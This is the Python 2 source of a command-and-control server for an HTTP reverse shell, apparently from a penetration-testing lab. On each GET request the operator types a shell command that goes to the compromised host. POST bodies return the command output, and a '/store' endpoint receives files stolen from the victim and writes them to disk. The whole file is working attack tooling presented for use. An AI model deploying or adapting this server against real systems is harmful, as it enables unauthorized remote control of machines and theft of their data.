import BaseHTTPServer, cgi

HOST_NAME = '192.168.56.103'
PORT_NUMBER = 80

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

	def do_GET(s):
		command = raw_input('Shell>>>')
		s.send_response(200)
		s.send_header("Content-type", "text/html")
		s.end_headers()
		s.wfile.write(command)

	def do_POST(s):
		if s.path == '/store':
			try:
				ctype, blabla = cgi.parse_header(s.headers.getheader('Content-type'))
				print blabla
				if ctype == 'multipart/form-data':
					fs = cgi.FieldStorage(fp= s.rfile,
						headers=s.headers,
						environ={'REQUEST_METHOD': 'POST'})
				else:
					print '[-]Unexpected Post request received'
				fs_up = fs['file']

				with open('root/Desktop/1.txt','wb') as o:
					o.write( fs_up.file.read() )
					s.send_response(200)
					s.end_headers()
			except Exception, e:
				print e
			return
		s.send_response(200)
		s.end_headers()
		length = int(s.headers['Content-length'])
		postVar = s.rfile.read(length)
		print postVar


if __name__ == "__main__":
	server_class = BaseHTTPServer.HTTPServer
	httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

	try:
		httpd.serve_forever()
	
	except KeyboardInterrupt:
		print '[-]Server Closed'
		httpd.server_close()